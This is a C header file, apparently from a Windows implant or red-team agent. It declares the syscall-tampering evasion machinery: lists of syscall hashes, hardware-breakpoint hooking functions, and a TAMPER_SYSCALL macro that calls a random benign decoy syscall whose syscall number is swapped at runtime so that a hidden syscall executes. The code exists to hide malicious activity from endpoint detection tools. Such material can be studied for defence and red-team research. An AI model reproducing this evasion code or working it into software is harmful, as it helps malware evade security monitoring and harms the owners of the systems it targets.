//
// Created by Brendan Ortiz on 7/19/2024.
//

#ifndef SYSCALLS_H
#define SYSCALLS_H

#include "../../agent.h"
#include "../PeParsing/evasive.h"
#include "../../../crypt/Crypto.h"


typedef struct _SYSCALL_ENTRY {
    DWORD64 dw64Hash; //hash of the syscall
    ULONG_PTR uAddress; //address of the syscall to sort the array.
}SYSCALL_ENTRY, *pSYSCALL_ENTRY;

#define MAX_ENTRIES 600

typedef struct _SYS_ENTRY_LIST {
    SYSCALL_ENTRY Entries[MAX_ENTRIES];
    UINT32 u32Count;
}SYS_ENTRY_LIST, *pSYS_ENTRY_LIST;

typedef struct _BENIGN_SYSCALL_ENTRY {
    DWORD64 dw64Hash;
    ULONG_PTR uAddress;
    USHORT SSN;
}BENIGN_SYSCALL_ENTRY, *pBENIGN_SYSCALL_ENTRY;

typedef struct _BENIGN_ENTRY_LIST {
    BENIGN_SYSCALL_ENTRY Entries[MAX_ENTRIES];
    UINT32 u32Count;
} BENIGN_ENTRY_LIST, *pBENIGN_ENTRY_LIST;

extern pSYS_ENTRY_LIST g_SyscallList;
extern pBENIGN_ENTRY_LIST g_BenignSyscallList;

typedef struct _TAMPERED_SYSCALL {
    ULONG_PTR uParam1;
    ULONG_PTR uParam2;
    ULONG_PTR uParam3;
    ULONG_PTR uParam4;
    ULONG_PTR uParam5;
    ULONG_PTR uParam6;
    ULONG_PTR uParam7;
    ULONG_PTR uParam8;
    ULONG_PTR uParam9;
    ULONG_PTR uParamA;
    ULONG_PTR uParamB;
    DWORD dwSyscallNumber;
    INT Nargs;
} TAMPERED_SYSCALL, *pTAMPERED_SYSCALL;

BOOL PopulateSyscallList();
DWORD FetchSSNFromSyscallEntries(DWORD64 dw64Hash);
BOOL InitHardwareBreakpointHooking();
BOOL HaltHardwareBreakpointHooking();
VOID PopulateTamperedSyscall(ULONG_PTR uParam1, ULONG_PTR uParam2, ULONG_PTR uParam3, ULONG_PTR uParam4, ULONG_PTR uParam5, ULONG_PTR uParam6, ULONG_PTR uParam7, ULONG_PTR uParam8, ULONG_PTR uParam9, ULONG_PTR uParamA, ULONG_PTR uParamB, DWORD dwSyscallNumber, INT Nargs);
unsigned long long SetDr7Bits(unsigned long long CurrentDr7Register, int StartingBitPosition, int NmbrOfBitsToModify, unsigned long long NewBitValue);
BOOL InstallHardwareBreakpointHook(_In_ DWORD dwThreadID, _In_ ULONG_PTR uTargetFuncAddress);
BOOL InitializeTamperedSyscall(_In_ ULONG_PTR uCalledSyscallAddress, _In_ DWORD64 FunctionHash, _In_ INT Nargs, _In_ ULONG_PTR uParam1, _In_ ULONG_PTR uParam2, _In_ ULONG_PTR uParam3, _In_ ULONG_PTR uParam4, ULONG_PTR uParam5, ULONG_PTR uParam6, ULONG_PTR uParam7, ULONG_PTR uParam8, ULONG_PTR uParam9, ULONG_PTR uParamA, ULONG_PTR uParamB);
BOOL PopulateBenignSyscallList();

typedef NTSTATUS(NTAPI* t_NtDummyApi)(
    ULONG_PTR		uParm1,
    ULONG_PTR		uParm2,
    ULONG_PTR		uParm3,
    ULONG_PTR		uParm4,
    ULONG_PTR		uParm5,
    ULONG_PTR		uParm6,
    ULONG_PTR		uParm7,
    ULONG_PTR		uParm8,
    ULONG_PTR		uParm9,
    ULONG_PTR		uParmA,
    ULONG_PTR		uParmB		// One can add more fake parameters here if the original syscall required > 11 parms
);

/*
    TAMPER_SYSCALL:
        * Calls the "InitializeTamperedSyscall" function.
        * Calls the decoy syscall, "NtQuerySecurityObject". When "NtQuerySecurityObject" is executed, its SSN will be replaced with u32SyscallHash's SSN (that is the ssn of the real syscall to be executed).
          Therefore the kernel will invoke the function of hash "u32SyscallHash".
        * First 4 parameters of "NtQuerySecurityObject" are NULL, these are replaced by the VEH when triggered.
*/
#define TAMPER_SYSCALL(d64SyscallHash, Nargs, uParm1, uParm2, uParm3, uParm4, uParm5, uParm6, uParm7, uParm8, uParm9, uParmA, uParmB)		    \
    if (1){																																		\
                                                                                                                                                \
        NTSTATUS					STATUS					= 0x00;																				\
        t_NtDummyApi        		pDummyApi           	= NULL;																				\
                                                                                                                                                \
        pDummyApi = (t_NtDummyApi)g_BenignSyscallList->Entries[GenerateRandomNumber() % g_BenignSyscallList->u32Count].uAddress;	            \
        if (!InitializeTamperedSyscall(pDummyApi, d64SyscallHash, Nargs, uParm1, uParm2, uParm3, uParm4,                                        \
                                uParm5, uParm6, uParm7, uParm8, uParm9, uParmA, uParmB))									                    \
            return;																															    \
                                                                                                                                                \
        if ((STATUS = pDummyApi(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) != 0x00) {		                            \
            printf("[!] 0x%llx Failed With Error: 0x%llx \n", d64SyscallHash, STATUS);														    \
            return;																															    \
        }																																		\
    }



#endif //SYSCALLS_H
